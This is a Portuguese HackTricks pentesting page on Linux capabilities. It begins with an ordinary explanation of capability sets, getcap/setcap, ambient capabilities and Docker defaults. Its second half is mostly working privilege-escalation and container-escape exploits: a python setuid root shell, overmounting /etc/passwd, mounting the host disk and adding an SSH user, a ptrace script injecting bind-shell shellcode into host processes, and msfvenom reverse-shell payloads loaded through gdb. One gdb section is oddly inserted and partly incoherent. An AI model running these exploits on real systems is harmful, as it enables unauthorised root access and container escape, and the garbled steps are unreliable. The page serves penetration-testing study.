# Capacidades do Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.\\

{% embed url="https://www.rootedcon.com/" %}

## Por que capacidades?

As capacidades do Linux **fornecem um subconjunto dos privilégios de root disponíveis** a um processo. Isso efetivamente divide os privilégios de root em unidades menores e distintas. Cada uma dessas unidades pode ser concedida independentemente a processos. Dessa forma, o conjunto completo de privilégios é reduzido e os riscos de exploração são diminuídos.

Para entender melhor como as capacidades do Linux funcionam, vamos dar uma olhada primeiro no problema que elas tentam resolver.

Vamos supor que estamos executando um processo como um usuário normal. Isso significa que não temos privilégios. Podemos acessar apenas dados que nos pertencem, ao nosso grupo ou que estão marcados para acesso por todos os usuários. Em algum momento, nosso processo precisa de um pouco mais de permissões para cumprir suas funções, como abrir um soquete de rede. O problema é que usuários normais não podem abrir um soquete, pois isso requer permissões de root.

## Conjuntos de capacidades

**Capacidades herdadas**

**CapEff**: O conjunto de capacidades _efetivas_ representa todas as capacidades que o processo está usando no momento (este é o conjunto real de capacidades que o kernel usa para verificações de permissão). Para capacidades de arquivo, o conjunto efetivo é, na verdade, um único bit que indica se as capacidades do conjunto permitido serão movidas para o conjunto efetivo ao executar um binário. Isso torna possível para binários que não são conscientes de capacidades fazer uso de capacidades de arquivo sem emitir chamadas de sistema especiais.

**CapPrm**: (_Permitido_) Este é um superconjunto de capacidades que a thread pode adicionar a qualquer um dos conjuntos permitidos ou herdáveis da thread. A thread pode usar a chamada do sistema capset() para gerenciar capacidades: ela pode descartar qualquer capacidade de qualquer conjunto, mas só pode adicionar capacidades aos seus conjuntos efetivos e herdáveis da thread que estão em seu conjunto permitido da thread. Consequentemente, não pode adicionar nenhuma capacidade ao seu conjunto permitido da thread, a menos que tenha a capacidade cap\_setpcap em seu conjunto efetivo da thread.

**CapInh**: Usando o conjunto _herdado_, todas as capacidades que podem ser herdadas de um processo pai podem ser especificadas. Isso impede que um processo receba quaisquer capacidades que não precise. Este conjunto é preservado em um `execve` e geralmente é definido por um processo que _recebe_ capacidades em vez de por um processo que está distribuindo capacidades para seus filhos.

**CapBnd**: Com o conjunto _limitado_, é possível restringir as capacidades que um processo pode receber. Somente as capacidades presentes no conjunto limitado serão permitidas nos conjuntos herdáveis e permitidos.

**CapAmb**: O conjunto de capacidades _ambientais_ se aplica a todos os binários não SUID sem capacidades de arquivo. Ele preserva as capacidades ao chamar `execve`. No entanto, nem todas as capacidades no conjunto ambiental podem ser preservadas porque estão sendo descartadas caso não estejam presentes nos conjuntos herdáveis ou permitidos de capacidade. Este conjunto é preservado em chamadas `execve`.

Para uma explicação detalhada da diferença entre capacidades em threads e arquivos e como as capacidades são passadas para threads, leia as seguintes páginas:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacidades de processos e binários

### Capacidades de processos

Para ver as capacidades de um processo específico, use o arquivo **status** no diretório /proc. Como ele fornece mais detalhes, vamos limitá-lo apenas às informações relacionadas às capacidades do Linux.\
Observe que, para todas as informações de capacidade de processos em execução, elas são mantidas por thread, para binários no sistema de arquivos, elas são armazenadas em atributos estendidos.

Você pode encontrar as capacidades definidas em /usr/include/linux/capability.h

Você pode encontrar as capacidades do processo atual em `cat /proc/self/status` ou fazendo `capsh --print` e de outros usuários em `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Este comando deve retornar 5 linhas na maioria dos sistemas.

* CapInh = Capacidades herdadas
* CapPrm = Capacidades permitidas
* CapEff = Capacidades efetivas
* CapBnd = Conjunto limitante
* CapAmb = Conjunto de capacidades ambientes
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Estes números hexadecimais não fazem sentido. Usando a ferramenta capsh, podemos decodificá-los em nomes de capacidades.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Vamos verificar agora as **capacidades** usadas pelo `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Embora isso funcione, há outra maneira mais fácil. Para ver as capacidades de um processo em execução, basta usar a ferramenta **getpcaps** seguida pelo seu ID de processo (PID). Você também pode fornecer uma lista de IDs de processo.
```bash
getpcaps 1234
```
Vamos verificar aqui as capacidades do `tcpdump` depois de ter dado ao binário capacidades suficientes (`cap_net_admin` e `cap_net_raw`) para capturar o tráfego de rede (_tcpdump está sendo executado no processo 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Como você pode ver, as capacidades fornecidas correspondem aos resultados das duas maneiras de obter as capacidades de um binário. A ferramenta _getpcaps_ usa a chamada do sistema **capget()** para consultar as capacidades disponíveis para uma determinada thread. Essa chamada do sistema só precisa fornecer o PID para obter mais informações.

### Capacidades de Binários

Os binários podem ter capacidades que podem ser usadas durante a execução. Por exemplo, é muito comum encontrar o binário `ping` com a capacidade `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Você pode **procurar binários com capacidades** usando:
```bash
getcap -r / 2>/dev/null
```
### Descartando capacidades com capsh

Se descartarmos as capacidades CAP\_NET\_RAW para o _ping_, então a utilidade de ping não funcionará mais.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Além da saída do _capsh_ em si, o próprio comando _tcpdump_ também deve gerar um erro.

> /bin/bash: /usr/sbin/tcpdump: Operação não permitida

O erro claramente mostra que o comando ping não tem permissão para abrir um socket ICMP. Agora sabemos com certeza que isso funciona como esperado.

### Remover Capacidades

Você pode remover capacidades de um binário com o comando:
```bash
setcap -r </path/to/binary>
```
## Capacidades do Usuário

Aparentemente, **é possível atribuir capacidades também aos usuários**. Isso provavelmente significa que todo processo executado pelo usuário poderá usar as capacidades do usuário. Com base em [isto](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [isto](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) e [isto](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), alguns arquivos precisam ser configurados para dar a um usuário determinadas capacidades, mas aquele que atribui as capacidades a cada usuário será `/etc/security/capability.conf`.\
Exemplo de arquivo:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacidades de Ambiente

Compilando o seguinte programa, é possível **iniciar um shell bash dentro de um ambiente que fornece capacidades**.

{% code title="ambient.c" %}
```c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```
{% endcode %} (This tag should not be translated)
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Dentro do **bash executado pelo binário de ambiente compilado** é possível observar as **novas capacidades** (um usuário regular não terá nenhuma capacidade na seção "atual").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Você só pode adicionar capacidades que estão presentes nos conjuntos permitidos e herdáveis.
{% endhint %}

### Binários com Conhecimento de Capacidades/Binários sem Conhecimento de Capacidades

Os **binários com conhecimento de capacidades não usarão as novas capacidades** fornecidas pelo ambiente, no entanto, os **binários sem conhecimento de capacidades as usarão**, pois não as rejeitarão. Isso torna os binários sem conhecimento de capacidades vulneráveis dentro de um ambiente especial que concede capacidades aos binários.

## Capacidades de Serviço

Por padrão, um **serviço em execução como root terá todas as capacidades atribuídas**, e em algumas ocasiões isso pode ser perigoso.\
Portanto, um arquivo de **configuração de serviço permite especificar** as **capacidades** que você deseja que ele tenha, **e** o **usuário** que deve executar o serviço para evitar a execução de um serviço com privilégios desnecessários:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capacidades em Contêineres Docker

Por padrão, o Docker atribui algumas capacidades aos contêineres. É muito fácil verificar quais são essas capacidades executando:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Escape de Contêiner

As capacidades são úteis quando você **deseja restringir seus próprios processos após realizar operações privilegiadas** (por exemplo, após configurar chroot e vincular a um soquete). No entanto, elas podem ser exploradas passando comandos ou argumentos maliciosos que são executados como root.

Você pode forçar capacidades em programas usando `setcap` e consultar essas capacidades usando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
O `+ep` significa que você está adicionando a capacidade ("-" removeria) como Eficaz e Permitida.

Para identificar programas em um sistema ou pasta com capacidades:
```bash
getcap -r / 2>/dev/null
```
### Exemplo de exploração

No exemplo a seguir, o binário `/usr/bin/python2.6` é encontrado vulnerável a privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacidades** necessárias pelo `tcpdump` para **permitir que qualquer usuário capture pacotes**:

Para permitir que qualquer usuário capture pacotes com o `tcpdump`, é necessário que o binário tenha a capacidade `CAP_NET_RAW`. Isso pode ser feito com o seguinte comando:

```
sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### O caso especial de capacidades "vazias"

Observe que é possível atribuir conjuntos de capacidades vazios a um arquivo de programa e, portanto, é possível criar um programa set-user-ID-root que altera o ID de usuário efetivo e salvo do processo que executa o programa para 0, mas não confere nenhuma capacidade a esse processo. Ou, simplesmente, se você tiver um binário que:

1. não é de propriedade do root
2. não tem bits `SUID`/`SGID` definidos
3. tem conjunto de capacidades vazio (por exemplo: `getcap myelf` retorna `myelf =ep`)

então **esse binário será executado como root**.

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) é em grande parte uma capacidade geral, que pode facilmente levar a capacidades adicionais ou a root completo (geralmente acesso a todas as capacidades). `CAP_SYS_ADMIN` é necessário para realizar uma série de **operações administrativas**, o que é difícil de remover de contêineres se operações privilegiadas forem realizadas dentro do contêiner. Manter essa capacidade é frequentemente necessário para contêineres que imitam sistemas inteiros em comparação com contêineres de aplicativos individuais que podem ser mais restritivos. Entre outras coisas, isso permite **montar dispositivos** ou abusar do **release\_agent** para escapar do contêiner.

**Exemplo com binário**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando python, você pode montar um arquivo _passwd_ modificado em cima do arquivo _passwd_ real:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
E finalmente **monte** o arquivo `passwd` modificado em `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
E você será capaz de **`su` como root** usando a senha "password".

**Exemplo com ambiente (Docker breakout)**

Você pode verificar as capacidades habilitadas dentro do contêiner Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro da saída anterior, você pode ver que a capacidade SYS\_ADMIN está habilitada.

* **Montagem**

Isso permite que o contêiner docker **monte o disco do host e acesse-o livremente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Acesso total**

No método anterior, conseguimos acessar o disco do host do Docker.\
Caso você descubra que o host está executando um servidor **ssh**, você pode **criar um usuário dentro do disco do host do Docker** e acessá-lo via SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

Isso significa que você pode escapar do contêiner injetando um shellcode dentro de algum processo em execução dentro do host. Para acessar processos em execução dentro do host, o contêiner precisa ser executado pelo menos com **`--pid=host`**.

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite o uso de `ptrace(2)` e chamadas de sistema de anexo de memória cruzada recentemente introduzidas, como `process_vm_readv(2)` e `process_vm_writev(2)`. Se essa capacidade for concedida e a chamada do sistema `ptrace(2)` em si não for bloqueada por um filtro seccomp, isso permitirá que um invasor ignore outras restrições seccomp, consulte [PoC para ignorar seccomp se ptrace for permitido](https://gist.github.com/thejh/8346f47e359adecd1d53) ou o **seguinte PoC**:

**Exemplo com binário (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Exemplo com binário (gdb)**

`gdb` com a capacidade `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
# Criando um shellcode com msfvenom para injetar na memória via gdb

Para criar um shellcode com o msfvenom, você pode usar o seguinte comando:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f c
```

Substitua `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

O parâmetro `-f c` indica que o formato de saída deve ser em C, o que é necessário para injetar o shellcode na memória via gdb.

Depois de criar o shellcode, você pode injetá-lo na memória usando o gdb da seguinte maneira:

1. Abra o gdb e anexe-o ao processo que você deseja atacar:

```
gdb -p <PID>
```

Substitua `<PID>` pelo ID do processo que você deseja atacar.

2. Crie um breakpoint em uma função que será chamada pelo processo:

```
break <função>
```

Substitua `<função>` pelo nome da função que você deseja usar como ponto de entrada para o shellcode.

3. Execute o processo até que o breakpoint seja atingido:

```
continue
```

4. Use o comando `call` do gdb para injetar o shellcode na memória:

```
call (void*)mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)
```

Este comando aloca uma página de memória com permissões de leitura, gravação e execução e retorna o endereço base da página.

5. Copie o shellcode para a página de memória alocada:

```
call (int)memcpy(<endereço da página>, <endereço do shellcode>, <tamanho do shellcode>)
```

Substitua `<endereço da página>` pelo endereço retornado pelo comando `mmap`, `<endereço do shellcode>` pelo endereço do shellcode e `<tamanho do shellcode>` pelo tamanho do shellcode.

6. Execute o shellcode:

```
call (<tipo de função>)<endereço da página>()
```

Substitua `<tipo de função>` pelo tipo de função que você deseja usar para chamar o shellcode (por exemplo, `void` ou `int`) e `<endereço da página>` pelo endereço retornado pelo comando `mmap`.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```
Depurar um processo root com gdb e copiar e colar as linhas do gdb geradas anteriormente:

```
# Attach to the process
gdb -p <pid>

# Enable debugging symbols
(gdb) symbol-file /usr/lib/debug/.build-id/<debug-id>.debug

# Set the breakpoint
(gdb) break main

# Continue execution
(gdb) continue

# Once the breakpoint is hit, set the uid/gid to 0
(gdb) call setresuid(0, 0, 0)
(gdb) call setresgid(0, 0, 0)

# Continue execution until the vulnerability is triggered
(gdb) continue
```
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Exemplo com ambiente (Docker breakout) - Outro abuso do gdb**

Se o **GDB** estiver instalado (ou você pode instalá-lo com `apk add gdb` ou `apt install gdb`, por exemplo), você pode **depurar um processo do host** e fazê-lo chamar a função `system`. (Essa técnica também requer a capacidade `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
